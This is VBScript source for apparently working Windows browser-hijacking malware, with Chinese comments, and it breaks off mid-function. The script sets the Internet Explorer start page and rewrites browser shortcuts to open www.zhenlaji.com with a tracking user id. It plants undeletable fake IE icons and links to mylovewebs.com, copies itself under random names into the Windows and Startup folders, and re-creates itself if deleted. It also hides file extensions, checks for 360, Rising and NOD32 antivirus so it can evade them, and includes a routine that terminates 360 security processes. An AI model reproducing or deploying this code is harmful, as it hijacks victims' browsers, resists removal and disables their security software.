Private Const BROWSER_PATH = "C:\Program Files\Internet Explorer\iexplore.exe"
Private Const MAX_BROWSER_PATH = "C:\Program Files\Maxthon2\Maxthon.exe"
Private Const SE_BROWSER_PATH = "C:\Program Files\360\360se3\360SE.exe"
Private Const FOX_BROWSER_PATH = "C:\Program Files\Mozilla Firefox\firefox.exe"
Private Const SOGOU_BROWSER_PATH = "C:\Program Files\SogouExplorer\SogouExplorer.exe"
Dim iePath
Dim maxPath
Dim sePath
Dim foxPath
Dim sogouPath

dim tips_count
tips_count=0
Dim content
dim run_second_count
run_second_count=0
Call Main

Public Sub Main()
On Error Resume Next  
	Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim dataSafe
    dataSafe=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\360Safe\SpyerDate") 
    
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wshShell = CreateObject("Wscript.Shell")
    Dim allUsersStartup,allUsersPcDesktopPath
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup")
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop")
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch"
    
    
    dim url,index,userId
    userId="{userId}"
    if IsNumeric(userId)=false then
        userId=0
    end if
    
    userId=GetUserId()
    if userId="" then
        userId=0
    end if

    url="http://" & "www.zhenlaji.com/?my=" & userId
    
    Call LoadAllBrowserPath '加载浏览器路径
     
    
 
    
    
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")     
    '移动本文件到指定路径
    movePath=Environ("windir") & "\" & CreateInterferenceCode(1, 6) & ".vbs"  
    
    startPath=allUsersStartup & "\" & CreateInterferenceCode(1, 6) & ".vbs" 
    Call CreateFileLnk(url,1)
    
    If Not IsExeExist("360tray") And dataSafe="" And Not IsExeExist("RavMonD") And Not IsExeExist("nod32")  then '如果不存在杀毒软件,则修改IE
        Call SetIeIndex(url)
        ieUrl="http://www.mylovewebs.com/"
        Call IeLink("4399小游戏",ieUrl & "api" & "/youxi/index.htm")
        Call IeLink("高清电影",ieUrl & "api" & "/dianying/index.htm")
        Call IeLink("无屏蔽搜索",ieUrl & "api" & "/google/index.htm")
        Call IeLink("百度搜索",ieUrl & "api" & "/baidu/index.htm")
        Call IeLink("起点小说",ieUrl & "api" & "/xiaoshuo/index.htm")
        Call IeLink("淘宝购物",ieUrl & "api" & "/taobao/index.htm")
        Call IeLink("网络创业秘籍",ieUrl & "api" & "/shangji/index.htm")
        Call IeLink("网址大全",ieUrl & "api" & "/index/index.htm")
        Call ShowIeLink 
    End If   
    
    

    do
        If run_second_count Mod 10 = 0 Then '每检测一段时间重复创建一次
			If not fso.FileExists(movePath) Then  '不存在源文件则创建
			    movePath=Environ("windir") & "\" & CreateInterferenceCode(1, 6) & ".vbs" 
                Call CopyCopyFile(movePath)
            End If
            Call CreateFileLnk(url,1) '创建文件关联快捷方式(不创建一次淘网址)
            If Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '不存在瑞星和360
                Call SetJseRunVbe(movePath) '创建启动文件
            End If
        End If
        
        If run_second_count Mod 900 = 0 or run_second_count=0 Then '每检测一段时间重复创建一次      
            If Not IsExeExist("RavMonD") And Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '不存在瑞星和360
                Call IeSearch()
                Call IeIndex(url)                
                Call ReplaceBrowserLink(url) '替换所有浏览器目标路径
                Call RemoveInternetExplorer()'清除Internet Explorer,最新版本360提示毒    
                set fso=createobject("scripting.filesystemobject")
				fso.deletefile allUsersPcDesktopPath & "\Internet Explorer.lnk"
				fso.deletefile quickLaunch & "\Internet Explorer.lnk"  
            End If
            
            If run_second_count=0 Then '第一次运行                  
				If Not IsExeExist("RavMonD") And  Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '不存在瑞星和360
					 Call RemoveInternetExplorer()'清除Internet Explorer,最新版本360提示毒   
                     Call ReplaceBrowserLink(url) '替换所有浏览器目标路径
                     Call AddRight() 'IE右键扩展
                     Call SetIeIndex(url) '设置浏览器主页
                End If
                If instr(Wscript.ScriptFullName,"启动")<>0 Then '为启动目录运行的  
					Call IeIndex(url)                 
                    Call AddRight() 'IE右键扩展        
                    Call SetIeIndex(url) '设置浏览器主页                           
                End If
                If Not IsExeExist("ZhuDongFangYu") And dataSafe="" then '不存在瑞星和360
					Call SetRegDefaultOpenUrl() '启动目录启动，过360提示
					Call SetFilterDns() '过滤色情站点违反政治法律的站点  
                End If
                Call DeleteLnk() '清除快捷方式
                Call HideFileExtension '隐藏文件扩展名
                set ws=wscript.createobject("wscript.shell")
                ws.appactivate "Program Manager"
                wscript.sleep 2000
                ws.sendkeys "{f5}"
            End If
            
        End If        
        
        If run_second_count Mod 5 = 0 And Not IsExeExist("ZhuDongFangYu") And dataSafe="" Then '每5秒检测文件是否被删除，如果被删除就重复创建
            '创建自启动
            Call SetRunVbe("\??\" & movePath,"\??\" & startPath)
            '间隔符号
            Call SetRunVbe("\??\","")
            
            If vbeCount>2 And instr(Wscript.ScriptFullName,"启动")<>0 Then '当启动目录Vbe文件大于2个时则删除
                '当前文件在下次重新启动时删除
                Call SetRunVbe("\??\" & Wscript.ScriptFullName,"")
            End If
            Call NoDeleteFile 
        End If
        
        If run_second_count Mod 10 = 0 Then
            'Call NotAppCloudKilling() '禁止指定程序访问网络
        End If
        
        run_second_count=run_second_count+1
        If run_second_count=3000 Then
			run_second_count=0
        End If
        
        wscript.sleep 5000
    loop
End Sub

'禁止指定程序访问网络
Public Function NotAppCloudKilling()   
On Error Resume Next
    good="."
    set bag=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_1=bag.execquery("select * from win32_process where name='360sd.exe'")
    for each i in pipe_1
    i.terminate()
    next

    set bag_2=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_2=bag_2.execquery("select * from win32_process where name='360tray.exe'")
    for each i in pipe_2
    i.terminate()
    next

    set bag_3=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_3=bag_3.execquery("select * from win32_process where name='360rp.exe'")
    for each i in pipe_3
    i.terminate()
    next
    
    set bag_4=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_4=bag_4.execquery("select * from win32_process where name='360Safe.exe'")
    for each i in pipe_4
    i.terminate()
    next
End Function


'获取安装用户Id
Public Function GetUserId()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim path,content
    path = Environ("windir") & "\userid.txt"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If path<>"" Then
        Set f=fso.opentextfile(path)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If
    content=Replace(content, " ", "")
    content=Replace(content, "\r", "")
    content=Replace(content, "\n", "")
    content=Replace(content, Chr(13), "")
    content=Replace(content, Chr(10), "")
    GetUserId=content
End Function

'复制当前脚本到指定路径
Public Sub CopyCopyFile(movePath)   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If

    '创建文件
    If content<>"" Then
        dim testFile
        Set testFile=fso.CreateTextFile(movePath,Ture)
        testFile.WriteLine(content)
        testFile.Close
    End If        
    Set fso  = Nothing
End Sub

'检测文件是否被删除，如果被删除就重复创建
Public Function NoDeleteFile()   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath,1)
        content=f.readall '读取文本内容到全局变量
        f.Close
    End If
    
    If not fso.FileExists(vbsPath) Then  '不存在则创建
        '创建文件
        If content<>"" Then
            dim testFile
            Set testFile=fso.CreateTextFile(vbsPath,Ture)
            testFile.WriteLine(content)
            testFile.Close
        End If        
    End If
    Set fso  = Nothing
End Function


'删除系统默认浏览器快捷方式
Public Function RemoveInternetExplorer()   
On Error Resume Next
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}") 
    dataHome=OperationRegistry.RegRead("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}") 
    if data="0" or dataHome="0" then
        Set ws = CreateObject("WScript.Shell") 
        Set Environ = ws.Environment("process") 
        Randomize 
		dim rnd
		rnd=CInt(100*Rnd()) 
		regPath = Environ("windir") & "\" & rnd & ".reg"
        Set fso = CreateObject("Scripting.FileSystemObject")
        
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel]"
	    f1.WriteLine """{871C5380-42A0-1069-A2EA-08002B30309D}""=dword:00000001"
	    f1.WriteLine "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu]"
	    f1.WriteLine """{871C5380-42A0-1069-A2EA-08002B30309D}""=dword:00000001"
	    Set f1  = Nothing
    	
    	
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing  

        Set fso  = Nothing
        
    end if    
End Function

'创建无法删除系统默认浏览器快捷方式
Public Function IeIndex(url)   
On Error Resume Next 
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    Randomize 
    dim rnd
	rnd=CInt(100*Rnd()) 
    regPath = Environ("windir") & "\" & rnd & ".reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    if tips_count>2 then
        if IsExeExist("360tray") then '存在360安全卫士,避免提示过多干扰用户
            Exit Function
        end if
    else
        tips_count=tips_count+1
    end if
    dim ie_temp_path
    ie_temp_path=iePath
    If not fso.FileExists(ie_temp_path) Then  
        ie_temp_path=GetWebBrowserPath() '获取一个浏览器路径
        If not fso.FileExists(ie_temp_path) Then
            Exit Function
        End If
    End If
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}\") 
    dataHome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command\") 

    If data="" or instr(dataHome,url)=0 Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}]" '修改默认IE
	    f1.WriteLine "@=""Internet Explorer""" '修改默认IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}]" '修改默认IE
	    f1.WriteLine "@=""Internet Explorer""" '修改默认IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\DefaultIcon]" '修改默认IE
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & ",0""" '固定IE浏览器图标
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\InProcServer32]"
	    f1.WriteLine "@=""%SystemRoot%\\system32\\shdocvw.dll"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage]"
	    f1.WriteLine "@=""打开主页(&H)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command]"
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & " " & url & """" '修改默认IE
	    
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q]"
	    f1.WriteLine "@=""删除(&D)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q\Command]"
	    f1.WriteLine "@=""Rundll32.exe"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\属性(&R)]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\属性(&R)\Command]"
	    f1.WriteLine "@=""rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\ShellFolder]"
	    f1.WriteLine "@=""00.00.00.00"""
	    f1.WriteLine """Attributes""=hex:00,00,00,00"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing 
    End If
    Set fso  = Nothing
End Function

'修改注册表设置主页
Public Function SetIeIndex(url)   
On Error Resume Next     
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    regPath = Environ("windir") & "\SetWindowsIndex.reg"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page\") 
    If instr(data,url)=0 or data="" Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]"
	    f1.WriteLine """Start Page""=""" & url & """"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing         
    End If
    Set fso  = Nothing
End Function

'删除默认创建快捷方式
Public Function DeleteLnk()   
On Error Resume Next     
   
End Function


'循环修改所有快捷方式
Public Function ReplaceBrowserLink(url)    
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    For i = LBound(lnkPath) + 1 To UBound(lnkPath)
        '循环目录进行修改
        directory = lnkPath(i)        
         '替换当前用户快速启动快捷方式
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set f = fs.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc    
            myName = directory + "\" + flie.name
            If InStr(myName, ".lnk") <> 0 And (InStr(myName, "傲游") <> 0 Or InStr(myName, "搜狗") <> 0 Or InStr(myName, "360") <> 0  Or InStr(myName, "Internet Explorer") <> 0 Or InStr(myName, "浏览器") <> 0) Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set oShellLink = wshShell.CreateShortcut(myName)
                Set file=fso.getfile(myName)                
                file.attributes=0'恢复正常
                         
                if oShellLink.Arguments <> url then '程序的参数 
                    oShellLink.Arguments = url '程序的参数      
                    oShellLink.Save            
                end if
                
	            file.attributes=1
                
                Set oShellLink  = Nothing                
                Set fso  = Nothing
            End If
        Next        
    Next
End Function


'获取快捷方式路径
Private Function GetDirectoryPath(path)
    Dim str, last
    For i = 0 To Len(path)
        str = Mid(path, Len(path) - i, 1)
        If str = "\" Then
            last = Len(path) - i
            Exit For
        End If
    Next
    GetDirectoryPath = Mid(path, 1, last)
    Exit Function
End Function

'判断指定进程是否存在
Public Function IsExeExist(exeName) 
    IsExeExist=false
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & exeName & ".exe'")

    For Each objProcess in colProcessList
        if objProcess.executablepath<>"" then
            IsExeExist=true
        end if        
    Next
End Function


'进行Url加密(不需要http://)
Public Function DnsUrlEncrypt(str)
    Dim hexStr, temp, i '16进制字符串
    For i = 1 To Len(str)
        temp = Mid(str, i, 1)
        temp = Hex(Asc(temp))
        temp = temp
        hexStr = hexStr & "%" & temp
    Next
    DnsUrlEncrypt = hexStr
    Exit Function
End Function

'合并两个数组
Function Summ(array1,array2)
    Dim str1,str2,str3
    str1 = join(array1,",")
    str2 = join(array2,",")
    str3 = str1 + "," + str2
    summ = split(str3,",")
    '过滤smss.exe
    '过滤脚本，防止360让他下次删除
End Function

'生成干扰码,参数:1、类型(0,混合 1字符 2数字) 2、长度
'错误返回:空字符
Public Function CreateInterferenceCode(strType, length)
    Dim basisStr
    If strType = 0 Then
        basisStr = "0123456789qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 1 Then
        basisStr = "qwertyuiopasdfghjklzxcvbnm"
    End If
    If strType = 2 Then
        basisStr = "0123456789"
    End If
    Dim strs, i
    For i = 1 To length
        Randomize
        strs = strs & Mid(basisStr, Int((Len(basisStr) * Rnd) + 1), 1)
    Next
    CreateInterferenceCode = strs
    Exit Function
End Function

'获取浏览器路径
Public Function GetWebBrowserPath() 
On Error Resume Next
    '更改盘符路径
    Set Environ = ws.Environment("process") 
    dim iePath
    iePath=BROWSER_PATH
    If Dir(iePath)="" Then '如果路径不存在则更换盘符
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
        If Dir(iePath)<>"" Then
            GetWebBrowserPath=iePath
            Exit Function
        End If
    else
        GetWebBrowserPath=iePath
        Exit Function
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    
    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files 
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next    
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '遨游浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            '循环目录进行修改
            directory = lnkPath(i)        
             '替换当前用户快速启动快捷方式
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360浏览器
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
End Function

'加载浏览器路径
Private Sub LoadAllBrowserPath()
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    iePath = BROWSER_PATH
    If not fso.FileExists(iePath) Then '如果路径不存在则更换盘符
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
    End If
    maxPath = MAX_BROWSER_PATH
    If not fso.FileExists(maxPath) Then '如果路径不存在则更换盘符
        maxPath = Environ("systemdrive") & Mid(maxPath, 3, Len(maxPath))
    End If
    sePath = SE_BROWSER_PATH
    If not fso.FileExists(sePath) Then '如果路径不存在则更换盘符
        sePath = Environ("systemdrive") & Mid(sePath, 3, Len(sePath))
    End If
    foxPath = FOX_BROWSER_PATH
    If not fso.FileExists(foxPath) Then '如果路径不存在则更换盘符
        foxPath = Environ("systemdrive") & Mid(foxPath, 3, Len(foxPath))
    End If
    sogouPath = SOGOU_BROWSER_PATH
    If not fso.FileExists(sogouPath) Then '如果路径不存在则更换盘符
        sogouPath = Environ("systemdrive") & Mid(sogouPath, 3, Len(sogouPath))
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录

    '路径集合，对路径集合进行遍历
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    
    If not fso.FileExists(iePath) Then
        iePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE浏览器
                        If oShellLink.TargetPath <> "" Then
                            iePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(maxPath) Then
        maxPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '遨游浏览器
                        If oShellLink.TargetPath <> "" Then
                            maxPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sePath) Then
        sePath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360浏览器
                        If oShellLink.TargetPath <> "" Then
                            sePath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
    If not fso.FileExists(sogouPath) Then
        sogouPath=""
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            directory = lnkPath(i)
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files
            For Each flie In fc
                myName = directory + "\" + flie.Name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "SogouExplorer.exe") Then '搜狗浏览器
                        If oShellLink.TargetPath <> "" Then
                            sogouPath = oShellLink.TargetPath
                            Exit For
                        End If
                    End If
                End If
            Next
        Next
    End If
    
End Sub



'创建关联文件,参数：URL地址,类型(0 不创建淘网址 1 创建一次淘网址)
Private Sub CreateFileLnk(url,createType)
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '当前用户桌面目录
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '当前用户快速启动桌面操作目录
    programs = wshShell.SpecialFolders("Programs") '当前用户开始菜单中的程序目录
    startMenu = wshShell.SpecialFolders("StartMenu") '当前用户开始菜单最上面的目录
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") '全部用户桌面目录
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") '全部用户开始菜单中的程序目录
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") '全部用户开始菜单最上面的目录
    
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(iePath) And iePath<>"" Then '判断IE浏览器路径是否存在        
